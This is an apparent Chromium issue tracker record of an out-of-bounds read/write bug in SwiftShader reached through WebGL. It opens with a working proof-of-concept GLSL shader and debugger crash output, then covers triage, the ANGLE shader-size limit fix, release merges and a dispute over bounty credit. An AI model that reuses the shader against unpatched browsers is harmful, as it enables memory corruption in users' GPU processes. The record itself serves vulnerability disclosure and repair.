# Arbitrary OOB read and write with WebGL via SwiftShader

| Field | Value |
|-------|-------|
| **Issue ID** | [40063770](https://issues.chromium.org/issues/40063770) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>WebGL, Internals>GPU>ANGLE |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | ma...@gmail.com |
| **Assignee** | sy...@chromium.org |
| **Created** | 2023-03-26 |
| **Bounty** | $10,000.00 |

## Description

**Steps to reproduce the problem:**  

0. Launch google-chrome with swiftshader as renderer: google-chrome --use-gl=swiftshader

1. For simplification, visit <https://www.shadertoy.com/new>
2. Copy this shader

```
uvec4 magic[0x7ffffff];  
  
uniform float q;  
  
int weird(int a, int b) {  
    return int(mod(float(a), float(b)));  
}  
  
ivec3 oobIndex(int off) {  
    int arrayIndex = off / 0x40;  
    int vec4Index = weird(off, 0x40);  
    int compIndex =  vec4Index / 0x10;  
    int combineIndex = weird(vec4Index, 0x10) / 8;  
    return ivec3(arrayIndex, compIndex, combineIndex);  
}  
  
uint oobRead(int off) {  
    ivec3 idx = oobIndex(off);  
    uvec4 comp = magic[idx.x];  
    return comp.x;  
}  
  
uint oobWrite(int off, uint value) {  
    ivec3 idx = oobIndex(off);  
    if (q != 1233112.0) {  
	    magic[idx.x] = uvec4(value);  
    }  
    return magic[idx.x].x;  
}  
  
void mainImage( out vec4 fragColor, in vec2 fragCoord )  
{  
    //uint v = oobRead(0x13371337);  
    uint v = oobWrite(0x13371337, uint(0x41414141));  
    fragColor = vec4(float(v), 0., 0. ,1.);  
}  

```

3. Click run
4. You would get a GPU process crash.
5. GDB info

RAX 0x26540257e2e0 ◂— 0xffffffffffffffff  

RBX 0x265407ef0b40 —▸ 0x265400c0c020 ◂— 0x100000000  

RCX 0x26540257f080 ◂— 0x300000003  

RDX 0x10  

RDI 0x265400c0c020 ◂— 0x100000000  

RSI 0x265406513690 ◂— 0xec00000000  

R8 0x26540b281c00 ◂— 0x0  

R9 0x100  

R10 0x9b00  

R11 0x246  

R12 0x26540073a580 ◂— 0x0  

R13 0x26540073a558 ◂— 0x0  

R14 0x26540a3b77f8 —▸ 0x2654024915b0 ◂— 0x4c4000000b0  

R15 0x26540073a428 —▸ 0x265400768940 ◂— 0x8089760000000000  

RBP 0x7f39025f95b0 —▸ 0x7f39025f9630 —▸ 0x7f39025f9650 —▸ 0x7f39025f96a0 —▸ 0x7f39025f9720 ◂— ...  

RSP 0x7f39025f9300 ◂— 0xaaaaaaaaaaaaaaaa  

RIP 0x7f39102cd052 ◂— movups xmmword ptr [rsp + 0x13371300], xmm3  

────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────────────────────────────────────────────  

► 0x7f39102cd052 movups xmmword ptr [rsp + 0x13371300], xmm3 <0x7f391596a600>  

0x7f39102cd05a movabs rax, 0x26540257eea0  

0x7f39102cd064 movups xmm1, xmmword ptr [rax]  

0x7f39102cd067 movabs rax, 0x26540257e2e0  

0x7f39102cd071 movups xmm2, xmmword ptr [rax]  

0x7f39102cd074 movups xmm3, xmm4  

0x7f39102cd077 pand xmm4, xmm2  

0x7f39102cd07b movups xmm2, xmmword ptr [rsp + 0x13371310]  

0x7f39102cd083 movabs rax, 0x26540257e2e0  

0x7f39102cd08d movups xmm5, xmmword ptr [rax]  

0x7f39102cd090 movups xmm6, xmm4  

───────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────────────────────────────────────────────────────  

► f 0 0x7f39102cd052  

f 1 0xaaaaaaaaaaaaaaaa  

f 2 0xaaaaaaaaaaaaaaaa  

f 3 0x0  

───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────  

pwndbg> p /x $xmm3  

$1 = {  

v8\_bfloat16 = {0x4141, 0x4141, 0x4141, 0x4141, 0x4141, 0x4141, 0x4141, 0x4141},  

v8\_half = {0x4141, 0x4141, 0x4141, 0x4141, 0x4141, 0x4141, 0x4141, 0x4141},  

v4\_float = {0x41414141, 0x41414141, 0x41414141, 0x41414141},  

v2\_double = {0x4141414141414141, 0x4141414141414141},  

v16\_int8 = {0x41 <repeats 16 times>},  

v8\_int16 = {0x4141, 0x4141, 0x4141, 0x4141, 0x4141, 0x4141, 0x4141, 0x4141},  

v4\_int32 = {0x41414141, 0x41414141, 0x41414141, 0x41414141},  

v2\_int64 = {0x4141414141414141, 0x4141414141414141},  

uint128 = 0x41414141414141414141414141414141  

}

**Problem Description:**  

TBH, I have not looked into the issue since I did not discover the bug. However, I'm not 100% sure it was reported to the chromium team, so I wanted to be safe.  

The issue lies in SwiftShader.

Between March 10 and 12, we had the HXP CTF where one of the tasks "shadertoy\_plus\_plus" was aiming at finding 0day bugs related to ANGLE and SwiftShader.  

At that point, we already knew there is a bug in SwiftShader for handling atomic operations which we reported at <https://bugs.chromium.org/p/chromium/issues/detail?id=1403728#c_ts1678974908>  

This bug was considered mostly harmless because the feature is not accessible in WebGL.

During the competition, a member of team COPY found a 0day bug in SwiftShader which allows arbitrary read and write in the GPU process.  

This report is to ensure it gets handled in case team COPY has not yet reported it.

**Additional Comments:**

\*\*Chrome version: \*\* 111.0.0.0 \*\*Channel: \*\* Stable

**OS:** Linux

## Timeline

### [Deleted User] (2023-03-26)

[Empty comment from Monorail migration]

### hc...@google.com (2023-03-27)

Copying some people from https://crbug.com/chromium/1403728 here, syoussefi@ put you as the primary owner because you were the last responder on that issue. Could you take a look?

### [Deleted User] (2023-03-27)

Setting Pri-1 to match security severity High. If this is incorrect, please reset the priority. Sheriffbot won't make this change again.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sy...@chromium.org (2023-03-27)

AFAICT, this has nothing to do with https://crbug.com/chromium/1403728

Simplifying a bit, only the array index is used from oobIndex, so this test boils down to:

uvec4 magic[0x7ffffff];
magic[0x13371337 / 0x40] = ...

0x13371337 / 0x40 = 0x4CDC4C which is < 0x7FFFFFF so in fact there doesn't seem to be any OOB access here.

Only problematic thing I see here is that `magic` is almost 2GB, and that's uncomfortably close to INT_MAX. I don't know enough about the internals of SwiftShader to tell if there could be signed integer overflow involved somewhere here.

@Ken, IIRC WebGL reserves the right to refuse to compile any shader, right? Can we make sure unreasonably sized arrays in shaders lead to compile errors?

### [Deleted User] (2023-03-27)

[Empty comment from Monorail migration]

### ma...@gmail.com (2023-03-27)

Could you please check if this bug is not a duplicate of any other reported bug?

As shared, the issue was discovered by a participating team in our CTF (HXP CTF 2022 https://2022.ctf.link/). However, I don't know if the team reported it to you.
This may save some analysis time.

### sy...@chromium.org (2023-03-27)

It's not a duplicate of any bug I know of*, but I'm not CCed on every security bugs, perhaps @hchao or other security folks would know.

* though the solution to not compile shaders with large arrays would also address https://crbug.com/chromium/1266809

### kb...@chromium.org (2023-03-27)

@Shabi yes, WebGL does allow shader compilation to fail for any reason. The "limitExpressionComplexity" and "limitCallStackDepth" workarounds in include/GLSLANG/ShaderLang.h encode similar workarounds.

Actually - I think this exact workaround was implemented under https://crbug.com/chromium/1220237 in https://chromium-review.googlesource.com/c/angle/angle/+/3023033 . Perhaps that should have been phrased as a workaround rather than built in to the core code. Should we redo it and/or lower the limit under which it triggers?


### kb...@chromium.org (2023-03-27)

[Empty comment from Monorail migration]

[Monorail components: Blink>WebGL Internals>GPU>ANGLE]

### sy...@chromium.org (2023-03-28)

Awesome. Yes, my suggestion is to just lower the limit.

Experimentally, I found 0x1ffffff makes the crash go away (that's a quarter of the current limit). However, I honestly don't think a shader can realistically expect to declare an object of any size > a KB and still run efficiently. My suggestion is to just limit it to 1MB (which is already highly excessive). The CL seems like it validates everything though, including UBOs, but those _could_ be larger so we could make this a limit only for locals/globals.

### kb...@chromium.org (2023-03-28)

The main concern would be shaders which - for better or worse - are allocating a bunch of temporary storage right now, and which will stop working once this new limit is enforced. I'd like to test the content from https://crbug.com/angleproject/7137 with this change and make sure it's still running as expected.


### kb...@chromium.org (2023-03-29)

Verified that the test case from https://crbug.com/angleproject/7137 still runs correctly with the new limit added.


### sy...@chromium.org (2023-03-29)

Thanks for checking. I looked at the shader in that issue; the array is inside a uniform buffer, whose size limit is unaffected by this change.

### gi...@appspot.gserviceaccount.com (2023-03-29)

The following revision refers to this bug:
  https://chromium.googlesource.com/angle/angle/+/fe45418c6592ab210ba5a6101f5058fe24eed266

commit fe45418c6592ab210ba5a6101f5058fe24eed266
Author: Shahbaz Youssefi <syoussefi@chromium.org>
Date: Tue Mar 28 15:43:23 2023

Translator: Limit the size of private variables in WebGL shaders

As a follow up to
https://chromium-review.googlesource.com/c/angle/angle/+/3023033, the
limit to shader-private variables (locals and globals) is further
reduced to 1MB.  A variable that large will not fit in GPU registers and
will spill to memory, killing performance.

Bug: chromium:1427865
Change-Id: I77314d4b891c591cd9a83ad2aebb77d7256f3ada
Reviewed-on: https://chromium-review.googlesource.com/c/angle/angle/+/4377639
Reviewed-by: Kenneth Russell <kbr@chromium.org>

[modify] https://crrev.com/fe45418c6592ab210ba5a6101f5058fe24eed266/src/tests/gl_tests/WebGLCompatibilityTest.cpp
[modify] https://crrev.com/fe45418c6592ab210ba5a6101f5058fe24eed266/src/compiler/translator/ValidateTypeSizeLimitations.cpp


### sy...@chromium.org (2023-03-29)

[Empty comment from Monorail migration]

### sy...@chromium.org (2023-03-29)

[Empty comment from Monorail migration]

### ma...@gmail.com (2023-03-29)

Even with the applied restrictions, it makes sense to verify that there is no other issue which still allows OOB accesses.
Ideally, SwiftShader itself can ensure this.

Could you add somebody from the SwiftShader team to this  bug?

### [Deleted User] (2023-03-29)

[Empty comment from Monorail migration]

### [Deleted User] (2023-03-29)

Setting milestone and target because of high severity.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### gi...@appspot.gserviceaccount.com (2023-03-29)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/cadd6abac438d3d21388b9ea363d480bdb25786d

commit cadd6abac438d3d21388b9ea363d480bdb25786d
Author: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
Date: Wed Mar 29 19:36:49 2023

Roll ANGLE from da7dd31f27e1 to 4afbbe85d9eb (5 revisions)

https://chromium.googlesource.com/angle/angle.git/+log/da7dd31f27e1..4afbbe85d9eb

2023-03-29 mikes@lunarg.com Tests: Add Vainglory trace
2023-03-29 syoussefi@chromium.org Translator: Limit the size of private variables in WebGL shaders
2023-03-29 syoussefi@chromium.org Vulkan: Work around driver bug with dynamic primitive restart
2023-03-29 syoussefi@chromium.org GLES1: Use ASCII minus in https://crbug.com/chromium/1427865#c2023-03-29 lexa.knyazev@gmail.com D3D11: Support NV_shader_noperspective_interpolation

If this roll has caused a breakage, revert this CL and stop the roller
using the controls here:
https://autoroll.skia.org/r/angle-chromium-autoroll
Please CC angle-team@google.com,geofflang@google.com on the revert to ensure that a human
is aware of the problem.

To file a bug in ANGLE: https://bugs.chromium.org/p/angleproject/issues/entry
To file a bug in Chromium: https://bugs.chromium.org/p/chromium/issues/entry

To report a problem with the AutoRoller itself, please file a bug:
https://bugs.chromium.org/p/skia/issues/entry?template=Autoroller+Bug

Documentation for the AutoRoller is here:
https://skia.googlesource.com/buildbot/+doc/main/autoroll/README.md

Cq-Include-Trybots: luci.chromium.try:android_optional_gpu_tests_rel;luci.chromium.try:linux_optional_gpu_tests_rel;luci.chromium.try:mac_optional_gpu_tests_rel;luci.chromium.try:win_optional_gpu_tests_rel;luci.chromium.try:linux-swangle-try-x64;luci.chromium.try:win-swangle-try-x86
Bug: chromium:1427865
Tbr: geofflang@google.com
Test: Test: angle_trace_tests --gtest_filter=TraceTest.vainglory
Change-Id: I3efeb0ee189f603d4704a248888f4c85df892d98
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/4382385
Commit-Queue: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
Bot-Commit: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
Cr-Commit-Position: refs/heads/main@{#1123764}

[modify] https://crrev.com/cadd6abac438d3d21388b9ea363d480bdb25786d/DEPS


### [Deleted User] (2023-03-30)

[Empty comment from Monorail migration]

### [Deleted User] (2023-03-30)

Requesting merge to other stable M111 because latest trunk commit (1123764) appears to be after other stable branch point (1097615).

Requesting merge to stable M112 because latest trunk commit (1123764) appears to be after stable branch point (1109224).

Requesting merge to dev M113 because latest trunk commit (1123764) appears to be after dev branch point (1121455).

Merge review required: a commit with DEPS changes was detected.

Merge review required: a commit with DEPS changes was detected.

Merge review required: a commit with DEPS changes was detected.

Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

Sheriffbot has determined this fix is necessary on milestone(s): [111, 112, 113].

Please answer the following questions so that we can safely process this merge request:
1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been tested on Canary?
3. Has this fix been verified to not pose any stability regressions and does it pose potential stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.


For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sy...@chromium.org (2023-03-30)

1. https://chromium-review.googlesource.com/c/angle/angle/+/4377639
2. Just merged to Chromium yesterday, so maybe give it a few days!
3. We don't believe the new restriction would affect any real world shaders
4. No
5. No (Canary should be enough)

### am...@chromium.org (2023-03-31)

Thanks for landing this change so quickly syoussefi@ and for completing the merge questionnaire. Since this this was just merged and roll hasn't made it into a Canary build just yet, I'll revisit for merge review/approval on Monday. 112/Stable RC was already cut, so this fix would be shipped first respin of Stable/112. 

There are no further planned releases of M111/Stable or M110/Extended Stable (since original report and https://crbug.com/chromium/1403728) lend me to believe this issue has been around longer than M111. 

### am...@chromium.org (2023-03-31)

OP, thank you for the report. In fully reviewing https://crbug.com/chromium/1403728, I have some concerns with how long the root of this issue has been known or publicly alluded to. 
However, https://crbug.com/chromium/1427865#c20 on that issue (https://bugs.chromium.org/p/chromium/issues/detail?id=1403728#c20) states: 
>>>I just wanted to disclose that we recently hosted a CTF (Security contest) specifically including a challenge based on ANGLE and SwiftShader. The challenge essentially allows user to provide a GLES 3.1 ComputeShader only and then it gets run in a Robust + "WebGL-compatible" context. The goal is to have the crafted shader execute arbitrary system code to steal a secret file.

>>>Challenge is at https://2022.ctf.link/internal/challenge/b3c5ffc6-2877-4954-ac88-ff3d21a134bb
>>>We don't share this or other bugs, but merely hint that "there are bugs".

>>>Overall:
>>>- two teams found the exact same atomicCounter exploitation
>>>- one team actually found a 0day which works on Linux, Version 110.0.5481.100 (Official Build) (64-bit)

I'm interpreting as this bug was found by one of the participating CTF teams and you left it up to them to disclose it. But, since you are the one disclosing this issue and there are no duplicates, it seems that the team that discovered this issue has chosen not to disclose it to us? 
OP is my interpretation correct? 
 


### am...@chromium.org (2023-03-31)

to OP again: just as I was reviewing your page I saw the "Pls don't sue" footer, so I just want to make sure that the intent of my questions above is not in any way of punitive intent to you, the CTF, or the team that discovered this bug. :) 
Any concerns and consideration here are around if we need to escalate shipping this fix faster to protect users as this issue may be more widely known that the average bug. Thank you :) 

### ma...@gmail.com (2023-03-31)

The sequence is roughly:

1. I wanted to have a "0day" challenge for the ctf while it not being available in widely available software

2. compute shaders was a good option, found the atomic op bug, and this generated the challenge. It was clear it's not accessible in Chrome.
    This is on December 27, 2.5 months before the CTF.

3. we are having the CTF, and while checking traffic, I noticed that one of the team's exploits is not GLES 3.1 or compute shader specific. I checked that it's a 0day.
    This is on March 11 or 12.

4. the team contacted us during the CTF and wanted to know if this is the expected solution. This is relatively common. I suggested that they report the issue.
    This is on March 11 or 12.

5. I eventually reported the issue to ensure that it actually is taken care of, and I am surprised that the team did not report this 0day.
    This is on March 26.

So, in total, there are two bugs reported: one inapplicable to chrome, and one applicable to latest chrome for linux.

There are two more teams who solved the challenge. These two teams ended up finding the same atomicOp bug.

Let me know if you have any more questions.
I still think we should look into what exactly caused the bug in SwiftShader, and I could do this if nobody else is checking.

### ma...@gmail.com (2023-03-31)

Small edit in point 2.
The atomicOp bug was found earlier than December 27. It was reported on the 27th.

### sy...@chromium.org (2023-03-31)

@Amy to make it doubly clear, the atomicCounter bug is not reachable by users without special flags. This bug is completely unrelated to that one.

### am...@chromium.org (2023-04-03)

[Empty comment from Monorail migration]

### am...@chromium.org (2023-04-04)

Thanks for the details and context, OP. And thank you syoussefi@ for the additional context! 
Let's just stay on track here to get this into M112 respin for sure. 
I'm not seeing any issues in Canary that appear to be introduced from this fix. 

M113 merge approved, please merge this fix to branch 5672 by EOD tomorrow 5 April so this fix can be included in the first M113 beta
M112 merge approved, please merge this fix to branch 5615 so this fix can be included in the M112/Stable security refresh. 

Thank you! 

### am...@google.com (2023-04-05)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### am...@chromium.org (2023-04-05)

Congratulations! The VRP Panel has decided to award you $10,000 for this report. A member of our finance team will be in touch with you soon to arrange payment. In the interim, please let us know if you would like to be acknowledged for this issue, and if so, what name/tag/handle you would like us to use in doing so. Thank you for reporting this issue to us! 

### am...@google.com (2023-04-08)

[Empty comment from Monorail migration]

### pb...@google.com (2023-04-10)

This merge has been approved for M113, please help complete your merges asap (before 1pm PST) tomorrow, so the change can be included in this week's RC build for beta releases.`

We would like to get the changes as much beta time as possible, so please complete your merges asap to M113 branch(go/chrome-branches).


### sr...@google.com (2023-04-12)

Please complete merge to M112 branch asap, so they can be included in the planned re-spin ( RC cut this friday)

### gi...@appspot.gserviceaccount.com (2023-04-12)

The following revision refers to this bug:
  https://chromium.googlesource.com/angle/angle/+/e874a2e43bf9f56c5fe968feafb4d33e0702e449

commit e874a2e43bf9f56c5fe968feafb4d33e0702e449
Author: Shahbaz Youssefi <syoussefi@chromium.org>
Date: Tue Mar 28 15:43:23 2023

M113: Translator: Limit the size of private variables in WebGL shaders

As a follow up to
https://chromium-review.googlesource.com/c/angle/angle/+/3023033, the
limit to shader-private variables (locals and globals) is further
reduced to 1MB.  A variable that large will not fit in GPU registers and
will spill to memory, killing performance.

Bug: chromium:1427865
Change-Id: I6d8061e2784812b2f9ea020dd99c8858a3d47adc
Reviewed-on: https://chromium-review.googlesource.com/c/angle/angle/+/4420768
Reviewed-by: Amirali Abdolrashidi <abdolrashidi@google.com>

[modify] https://crrev.com/e874a2e43bf9f56c5fe968feafb4d33e0702e449/src/tests/gl_tests/WebGLCompatibilityTest.cpp
[modify] https://crrev.com/e874a2e43bf9f56c5fe968feafb4d33e0702e449/src/compiler/translator/ValidateTypeSizeLimitations.cpp


### gi...@appspot.gserviceaccount.com (2023-04-12)

The following revision refers to this bug:
  https://chromium.googlesource.com/angle/angle/+/5becbed305e3da317f8c35150c24639e6590bba9

commit 5becbed305e3da317f8c35150c24639e6590bba9
Author: Shahbaz Youssefi <syoussefi@chromium.org>
Date: Tue Mar 28 15:43:23 2023

M112: Translator: Limit the size of private variables in WebGL shaders

As a follow up to
https://chromium-review.googlesource.com/c/angle/angle/+/3023033, the
limit to shader-private variables (locals and globals) is further
reduced to 1MB.  A variable that large will not fit in GPU registers and
will spill to memory, killing performance.

Bug: chromium:1427865
Change-Id: Ifbf5a6e9db213a9775690e6d514c55e9297e1483
Reviewed-on: https://chromium-review.googlesource.com/c/angle/angle/+/4420769
Reviewed-by: Amirali Abdolrashidi <abdolrashidi@google.com>

[modify] https://crrev.com/5becbed305e3da317f8c35150c24639e6590bba9/src/tests/gl_tests/WebGLCompatibilityTest.cpp
[modify] https://crrev.com/5becbed305e3da317f8c35150c24639e6590bba9/src/compiler/translator/ValidateTypeSizeLimitations.cpp


### aj...@google.com (2023-06-07)

[Empty comment from Monorail migration]

### [Deleted User] (2023-07-05)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### am...@chromium.org (2023-07-10)

In revisiting this issue due to some questions, I have noticed that despite the merges to other branches, there doesn't appear to be a Roll that allowed this fix to be shipped in a Stable channel update earlier than 114. Also during triage there was no foundin- added (it was added after the fact) and due to this and the multiple foundin- labels, this issue never received a SI- label and our release automation never picked up this issue for inclusion in security fix notes and CVE. 
So making some label adjustments here after the fact to allow for this. 

Fix commit (fe45418c6592ab210ba5a6101f5058fe24eed266) shipped in M114 (114.0.5735.45) so applying release-0-m114 label accordingly 


### am...@google.com (2023-07-10)

[Empty comment from Monorail migration]

### am...@chromium.org (2023-07-10)

[Empty comment from Monorail migration]

### am...@chromium.org (2023-07-10)

[Comment Deleted]

### am...@chromium.org (2023-07-10)

Upon the recently public disclosure of this issue, we have been made aware that there are some disagreements with how this was presented to us and our (Chrome Security / Chrome VRP) acknowledging this issue. 
 
This bug was apparently discovered during the course of an independent CTF. Neither Chrome, Google, or the ANGLE team was made aware of this issue via other sources at or prior to it being disclosed via this report. 

It was described to us by this reporter in the original report above that between 10-12 March this bugs was discovered as part of the “HXP CTF” and that the reporter of this issue did not discover this bug on their own, but since they were not “100% sure it was reported” to us, they wanted to be sure and did so over two weeks after the bug was first discovered and determined to be exploitable.

Part of security triage is checking for duplicates, and there was no previously reported duplicate of this issue at the time. 

The ANGLE team set about fixing this issue and the fix was released in the M114 milestone update of Chrome. 

This issue was also evaluated for the Chrome VRP [1] at time earliest VRP panel following when this bug was fixed. We, the Chrome VRP, decided on a $10,000 reward to be issued to the reporter of this report, based on the following conditions 1) this was the first (and only at the time) report of this issue, 2) bug class and impact and report quality, 3) this issue had not been reported to any other party and was not known to us prior to this report. 

At the time of this comment, there has only been one duplicate report of this security bug, via https://crbug.com/chromium/1451211, reported on 4 June 2023, well after this issue was fix and the patch shipped in a Stable channel update of Chrome. 

The reporter of this issue has just made us aware that the reporter of https://crbug.com/chromium/1451211 was key in the original discovery that led to this report. We are happy to include them in acknowledgement here and in the security fix / release notes for this issue when we receive that information. 

Otherwise, we do not see the need for any other action here. We do not plan to reissue this reward. The foundational goal and purpose of the Chrome VRP is to incentivize responsible disclosure of security bugs that allow us to fix the issue and ship that fix to users as soon as possible in order to protect the billions of Chrome users at soonest. This is what happened in this case. 

This report allowed for us to perform root cause analysis and fix this issue and ship this fix to users before any other information was provided to us, and for that reason, this report fits all of the criteria for qualifying vulnerabilities [2] for the Chrome VRP and this reporter eligible for that reward. 

While we understand and appreciate that there may be other contributors to this effort, we are only able to reward the individual(s) reporting a given issue to us. 

If there is any new information that is related to this issue or any indication this bug is still exploitable, we welcome that information and encourage it to be reported to us directly for a potential VRP reward and acknowledgement in its own right.

We also sincerely welcome and are happy to have any discussion the other contributors or contributor would like to have about this issue, either publicly on this issue (via the comments that are open to the public) or privately (by reaching out to security-vrp@chromium.org).


[1] https://g.co/chrome/vrp
[2] https://g.co/chrome/vrp/#qualifying-vulnerabilities

### [Deleted User] (2023-07-11)

This bug is a regression and does not impact stable or extended stable.Removing incorrectly added Release- labels.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### am...@chromium.org (2023-07-11)

[Empty comment from Monorail migration]

### kb...@chromium.org (2023-07-11)

[Empty comment from Monorail migration]

### am...@chromium.org (2023-07-17)

this issue was reported by sisu from CTF team HXP and discovered by a member of Apple Security Engineering and Architecture (SEAR) during HXP CTF 2022, which will be acknowledged in the security fix notes for the appropriate Stable channel release at the time they are updated


### gi...@appspot.gserviceaccount.com (2023-07-18)

The following revision refers to this bug:
  https://swiftshader.googlesource.com/SwiftShader/+/4e401427f8dd799b17ac6c805391e2da1e017672

commit 4e401427f8dd799b17ac6c805391e2da1e017672
Author: Brendon Tiszka <tiszka@chromium.org>
Date: Thu Jul 13 23:59:54 2023

[subzero] Fix integer overflows during alloca coalescing

Bug: chromium:1427865,chromium:1431761,chromium:1464038,chromium:1464680
Change-Id: Ie09a9ba3709d867544ca045b066b437e2d60da51
Reviewed-on: https://swiftshader-review.googlesource.com/c/SwiftShader/+/71928
Kokoro-Result: kokoro <noreply+kokoro@google.com>
Reviewed-by: Shahbaz Youssefi <syoussefi@google.com>
Presubmit-Ready: Shahbaz Youssefi <syoussefi@google.com>
Reviewed-by: Ben Clayton <bclayton@google.com>
Tested-by: Shahbaz Youssefi <syoussefi@google.com>
Commit-Queue: Shahbaz Youssefi <syoussefi@google.com>

[modify] https://swiftshader.googlesource.com/SwiftShader/+/4e401427f8dd799b17ac6c805391e2da1e017672/third_party/subzero/src/IceCfg.cpp


### gi...@appspot.gserviceaccount.com (2023-07-24)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/83b0bdb696d81b2d94e3aee77b3b6f86b96274c3

commit 83b0bdb696d81b2d94e3aee77b3b6f86b96274c3
Author: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
Date: Mon Jul 24 17:52:17 2023

Roll SwiftShader from 222e07b368b1 to 8d9a45b1f3ab (12 revisions)

https://swiftshader.googlesource.com/SwiftShader.git/+log/222e07b368b1..8d9a45b1f3ab

2023-07-24 bclayton@google.com LLVMReactor: Remove CreateFreeze() call
2023-07-23 bclayton@google.com LLVMReactor: Clamp RHS of bit shifts using type width
2023-07-22 bclayton@google.com Fix another 'sign-compare' warning as error
2023-07-22 bclayton@google.com Fix 'sign-compare' warning as error
2023-07-21 bclayton@google.com LLVMReactor: Clamp RHS of bit shifts.
2023-07-21 swiftshader.regress@gmail.com Regres: Update test lists @ 4a260c12
2023-07-21 bclayton@google.com ExecutableMemory: Use VirtualAlloc() instead of `new` on windows
2023-07-20 avi@google.com Don't allow Swiftshader to be compiled as ARC
2023-07-18 tiszka@chromium.org [subzero] Fix integer overflows during alloca coalescing
2023-07-12 aredulla@google.com [ssci] Added Shipped field to READMEs
2023-07-11 jif@google.com [LLVM 16] Have Swiftshader built with Android.bp use LLVM 16.
2023-07-04 jif@google.com [LLVM 16] Shifts do not generate poison values

If this roll has caused a breakage, revert this CL and stop the roller
using the controls here:
https://autoroll.skia.org/r/swiftshader-chromium-autoroll
Please CC capn@chromium.org,swiftshader-eng+autoroll@google.com on the revert to ensure that a human
is aware of the problem.

To file a bug in SwiftShader: https://bugs.chromium.org/p/swiftshader/issues/entry
To file a bug in Chromium: https://bugs.chromium.org/p/chromium/issues/entry

To report a problem with the AutoRoller itself, please file a bug:
https://bugs.chromium.org/p/skia/issues/entry?template=Autoroller+Bug

Documentation for the AutoRoller is here:
https://skia.googlesource.com/buildbot/+doc/main/autoroll/README.md

Cq-Include-Trybots: luci.chromium.try:linux_chromium_msan_rel_ng;luci.chromium.try:linux_optional_gpu_tests_rel;luci.chromium.try:mac_optional_gpu_tests_rel;luci.chromium.try:win_optional_gpu_tests_rel;luci.chromium.try:linux-swangle-try-x64;luci.chromium.try:win-swangle-try-x86
Bug: chromium:1427865,chromium:1431761,chromium:1464038,chromium:1464680,chromium:1466124,chromium:733237
Tbr: swiftshader-eng+autoroll@google.com
Change-Id: Ifea78e22e4b836267a9094fffa87ddda27516f1c
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/4711308
Bot-Commit: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
Commit-Queue: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
Cr-Commit-Position: refs/heads/main@{#1174303}

[modify] https://crrev.com/83b0bdb696d81b2d94e3aee77b3b6f86b96274c3/DEPS


### pg...@google.com (2023-07-28)

[Empty comment from Monorail migration]

### pg...@google.com (2023-07-28)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-09)

This issue was migrated from crbug.com/chromium/1427865?no_tracker_redirect=1

[Multiple monorail components: Blink>WebGL, Internals>GPU>ANGLE]
[Monorail blocked-on: crbug.com/angleproject/7137, crbug.com/chromium/1220237]
[Monorail blocking: crbug.com/chromium/1464038]
[Monorail mergedwith: crbug.com/chromium/1451211]
[Monorail components added to Component Tags custom field.]

### pe...@google.com (2024-03-12)

You have been auto-cc'ed due to this issue's component.
To update this component's auto-cc rules, visit
go/peepsi-blintz-auto-cc-rules

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40063770)*
